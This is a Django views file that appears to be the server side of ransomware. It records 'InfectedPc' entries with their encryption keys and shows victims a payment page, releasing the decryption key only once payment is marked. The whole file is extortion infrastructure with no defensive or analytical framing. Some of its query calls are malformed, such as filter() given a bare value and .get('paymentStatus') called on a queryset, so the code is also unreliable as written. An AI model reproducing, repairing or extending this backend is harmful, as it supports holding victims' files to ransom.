from rest_framework import generics
from .models import InfectedPc
from .serializers import InfectedPcSerializer
from django.http import HttpResponseRedirect, HttpResponse

from rest_framework import generics
from rest_framework import permissions
from rest_framework.response import Response
from rest_framework.views import status
from django.shortcuts import render
from .forms import decryptForm


class ListInfectedPcView(generics.ListAPIView):
    """
    Provides a get method handler.
    """
    queryset = InfectedPc.objects.all()
    serializer_class = InfectedPcSerializer
    #permission_classes = (permissions.IsAuthenticated,)

    def post(self, request, *args, **kwargs):
        created = InfectedPc.objects.get_or_create(
            uniqueId=request.data['uniqueId'],
            encryptionKey=request.data['encryptionKey'],
        )
        if created[1]:
            return Response(
                data="InfectedPC entry added",
                status=status.HTTP_201_CREATED
            )
        else:
            return Response(
                data="InfectedPC already existing",
                status=status.HTTP_200_OK
            )
def decrypt(request):
    # if this is a POST request we need to process the form data
    if request.method == 'POST':
        # create a form instance and populate it with data from the request:
        form = decryptForm(request.POST)
        # check whether it's valid:
        if form.is_valid():
            exists = InfectedPc.objects.filter(uniqueId = form.cleaned_data['uniqueId']).exists()
            paymentStatus = InfectedPc.objects.filter(form.cleaned_data['uniqueId']).get('paymentStatus')
            if exists == True and paymentStatus == False:
                return render(request, 'payment.html', {'uniqueId': form.cleaned_data['uniqueId']})
            if exists == True and paymentStatus == True:
                return HttpResponse(InfectedPc.objects.filter(uniqueId = form.cleaned_data['uniqueId']).get('encryptionKey'))
            else:
                return HttpResponse("uniqueId does not exist")
                #

    # if a GET (or any other method) we'll create a blank form
    else:
        form = decryptForm()

    return render(request, 'decrypt.html', {'form': form})
    

